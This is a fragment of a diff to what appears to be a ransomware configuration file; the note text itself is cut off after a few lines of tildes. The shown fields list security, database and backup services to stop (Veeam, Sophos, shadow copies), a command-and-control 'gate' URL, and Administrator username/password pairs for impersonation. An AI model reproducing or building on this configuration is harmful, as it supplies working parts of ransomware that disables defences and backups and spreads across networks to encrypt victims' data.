@@ -29,7 +29,7 @@
     "kill_services": "vss;sql;svc$;memtas;mepocs;msexchange;sophos;veeam;backup;GxVss;GxBlr;GxFWD;GxCVD;GxCIMgr",
     "gate_urls": "https://test.molombitoh1ck3r.com/",
     "impers_accounts": "ad.lab:Qwerty!;Administrator:123QWEqwe!@#;Admin2:P@ssw0rd;Administrator:P@ssw0rd;Administrator:Qwerty!;Administrator:123QWEqwe;Administrator:123QWEqweqwe",
-    "note":
+    "note": "
   
                  ~~~~~~~~~~                           ~~~~~~~~~~
                                    ~~~~~~~~~~~ 
